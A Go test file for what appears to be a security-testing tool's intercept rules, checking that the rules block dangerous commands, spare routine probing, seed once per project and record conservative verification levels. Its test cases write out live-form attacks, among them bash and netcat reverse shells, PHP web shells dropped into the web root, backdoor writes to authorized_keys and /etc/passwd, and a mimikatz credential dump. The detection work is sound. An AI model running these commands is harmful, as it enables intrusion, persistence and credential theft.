package db

import (
	"regexp"
	"testing"
	"time"
)

// 每条 V4 规则都要真的挡住它该挡的样本，否则规则形同虚设。
func TestBuiltinRulesV4CatchWhatTheyShould(t *testing.T) {
	cases := []struct {
		rule string
		in   string
	}{
		{"[内置] 数据库写入目标文件", `curl -s "http://t/?id=1 union select '<?php eval($_POST[1]);?>' into outfile '/var/www/html/a.php'-- -`},
		{"[内置] PostgreSQL COPY 导出到文件", `psql -c "COPY (SELECT * FROM users) TO '/tmp/users.csv' CSV"`},
		{"[内置] 数据库整库导出", `mysqldump -h db.example -u root -psecret app > /tmp/app.sql`},
		{"[内置] 数据库整库导出", `sqlmap -u http://t/?id=1 --dump-all --batch`},
		{"[内置] 反弹 shell", `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`},
		{"[内置] 反弹 shell", `nc -e /bin/sh 10.0.0.5 4444`},
		{"[内置] 向 Web 根目录落地文件", `echo '<?php system($_GET[c]);?>' > /var/www/html/upload/shell.php`},
		{"[内置] 写入系统关键文件", `echo 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys`},
		{"[内置] 写入系统关键文件", `echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd`},
		{"[内置] 持久化", `crontab -e`},
		{"[内置] 持久化", `systemctl enable backdoor.service`},
		{"[内置] 提权与横向工具", `./mimikatz.exe sekurlsa::logonpasswords`},
		{"[内置] 提权与横向工具", `chmod u+s /tmp/x`},
		{"[内置] 创建系统账号", `useradd -m -p $(openssl passwd -1 pwn) hacker`},
	}
	for _, c := range cases {
		var found *regexp.Regexp
		for _, r := range builtinRulesV4 {
			if r.Name == c.rule {
				re := regexp.MustCompile(r.Pattern)
				found = re
				if re.MatchString(c.in) {
					found = nil
					break
				}
			}
		}
		if found == nil {
			continue
		}
		t.Errorf("rule %q did not match %q", c.rule, c.in)
	}
}

// 反向约束：正常探测不能被误伤——误伤的代价是漏掉真漏洞。
func TestBuiltinRulesV4LeaveNormalTestingAlone(t *testing.T) {
	benign := []string{
		`curl -s "http://t/?id=1%20AND%201=2" -o /tmp/r1.json`,  // 布尔盲注
		`curl -s "http://t/?id=1'%20AND%20sleep(1)--"`,          // 短延时间盲注
		`sqlmap -u "http://t/?id=1" --batch --level 2 --risk 2`, // 常规扫描
		`mysql -h db -e "SELECT id,name FROM users LIMIT 5"`,    // 读少量数据
		`cat > payload.jsp <<'EOF'`,                             // 本地准备上传体
		`curl -o /tmp/upload.txt http://t/static/a.txt`,         // 下载样本
		`bash -c 'id'`,                                     // 命令执行最小证明
		`systemctl status nginx`,                           // 只读查看
		`crontab -l`,                                       // 只读列出
		`grep -i "into outfile" /tmp/app.log`,              // 只是在日志里搜关键字
		`echo "test" >> /tmp/artex/notes.txt`,              // 写自己的临时文件
		`python3 -c "print(open('/etc/hostname').read())"`, // 最小文件读取
	}
	for _, in := range benign {
		for _, r := range builtinRulesV4 {
			if regexp.MustCompile(r.Pattern).MatchString(in) {
				t.Errorf("rule %q wrongly matched benign input %q", r.Name, in)
			}
		}
	}
}

// 老项目（rules_seeded_at 已置位）也必须拿到 V4 规则；重复播种不能产生重复行。
func TestSeedInterceptRulesV4ReachesExistingProjects(t *testing.T) {
	d := openProjectTestDB(t)
	pid := testProjectID(t, d)
	// 模拟升级前的老项目：标记已灌过规则，且没有任何 V4 行。
	if _, err := d.Exec(`UPDATE projects SET rules_seeded_at = now() WHERE id = $1`, pid); err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec(`DELETE FROM intercept_rules WHERE project_id = $1 AND name = ANY($2)`, pid, v4RuleNames()); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 2; i++ { // 第二次是幂等性检查
		if err := d.seedRulesForProject(pid); err != nil {
			t.Fatal(err)
		}
	}
	for _, name := range v4RuleNames() {
		var n int
		if err := d.QueryRow(`SELECT count(*) FROM intercept_rules WHERE project_id = $1 AND name = $2`, pid, name).Scan(&n); err != nil {
			t.Fatal(err)
		}
		if n != 1 {
			t.Fatalf("rule %q rows = %d, want 1", name, n)
		}
	}
}

func v4RuleNames() []string {
	names := make([]string, 0, len(builtinRulesV4))
	for _, r := range builtinRulesV4 {
		names = append(names, r.Name)
	}
	return names
}

// 验证尺度落库：上报方声明了就按声明记，没声明就记最保守的一档，不能凭空变成
// standard（审核者会据此判断证据够不够，虚高等于骗人）。
func TestVerifyLevelPersistsAndDefaultsConservative(t *testing.T) {
	d := openProjectTestDB(t)
	task, err := d.CreateTask(testProjectID(t, d), "verify level "+time.Now().Format("150405.000000"), "g", nil, 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { d.DeleteFindingsByTask(task.ID); d.DeleteTask(task.ID) })

	explicit, err := d.AddFinding(task.ID, 0, "SQLi", "布尔差异", "high", "s", "e", "w", nil,
		FindingVerification{Level: "minimal", Impact: "none"})
	if err != nil {
		t.Fatal(err)
	}
	implicit, err := d.AddFinding(task.ID, 0, "XSS", "反射", "low", "s", "e", "w", nil)
	if err != nil {
		t.Fatal(err)
	}
	got, err := d.GetFinding(explicit)
	if err != nil || got == nil {
		t.Fatalf("get explicit: %v %v", got, err)
	}
	if got.VerifyLevel != "minimal" || got.ImpactObserved != "none" {
		t.Fatalf("explicit verification = %s/%s", got.VerifyLevel, got.ImpactObserved)
	}
	got, err = d.GetFinding(implicit)
	if err != nil || got == nil {
		t.Fatalf("get implicit: %v %v", got, err)
	}
	if got.VerifyLevel != "unknown" || got.ImpactObserved != "none" {
		t.Fatalf("unstated verification = %s/%s, want unknown/none", got.VerifyLevel, got.ImpactObserved)
	}
	if lvl, imp := NormalizeVerification("garbage", "destroy-everything"); lvl != "minimal" || imp != "none" {
		t.Fatalf("normalize = %s/%s, want minimal/none", lvl, imp)
	}
}
